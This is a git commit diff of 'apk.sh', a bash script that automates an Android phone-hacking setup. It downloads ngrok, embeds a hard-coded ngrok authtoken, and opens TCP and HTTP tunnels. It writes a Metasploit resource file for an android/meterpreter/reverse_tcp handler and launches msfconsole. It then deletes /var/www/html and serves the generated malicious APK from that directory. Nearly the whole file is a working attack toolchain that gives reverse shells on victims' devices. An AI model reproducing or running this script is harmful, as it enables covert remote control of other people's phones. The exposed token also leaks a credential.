c1310ae5cbd29a5d37b8065ed93073f208381999
zufair-aslam <61283690+zufair-aslam@users.noreply.github.com>
2020-04-22 10:19:04 -0500

    Update apk.sh

--- apk.sh
+++ apk.sh
@@ -1,14 +1,25 @@
 #!/bin/bash
 mkdir RC
 mkdir payload
+file="ngrok"
+if [ -f "$file" ]
+then
+	echo "$file found."
+else
+	echo "$file not found."
+        echo "downloading $file"
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
 unzip ngrok-stable-linux-amd64.zip
-rm ngrok-stable-linux-amd64.zip
-sudo apt install gnome-terminal
-echo 'starting services'
-sudo service postgresql start
-read -p 'choose for ngrok to start : ' lport
 ./ngrok authtoken 3TKGHN2vCqEzwEoRTNRFp_214CuTzXj7XZjTJVTdtp9
+rm ngrok-stable-linux-amd64.zip
+fi
+if ! gnome-terminal --help > /dev/null; then
+   echo -e "Command not found! Installing"
+      sudo apt-get install gnome-terminal
+fi
+echo 'starting services'
+service postgresql start
+read -p 'choose for ngrok to start : ' lport
 gnome-terminal -- ./ngrok tcp $lport
 read -p 'port provided by ngrok : ' port
 read -p 'payload name you want : ' pname
@@ -18,11 +29,14 @@ rm RC/hack.rc
 touch RC/hack.rc
             echo use exploit/multi/handler > RC/hack.rc
             echo set PAYLOAD android/meterpreter/reverse_tcp >> RC/hack.rc
-           
             echo set LHOST localhost >> RC/hack.rc
-            
             echo set LPORT $lport >> RC/hack.rc
             echo set ExitOnSession false >> RC/hack.rc
             echo exploit -j -z >> RC/hack.rc
             cat RC/hack.rc
-            xterm -e msfconsole -r RC/hack.rc
+            gnome-terminal -- msfconsole -r RC/hack.rc
+gnome-terminal -- ./ngrok http 8080
+sudo rm -rf /var/www/html
+sudo mkdir /var/www/html
+sudo cd payload
+sudo mv $pname -t /var/www/html
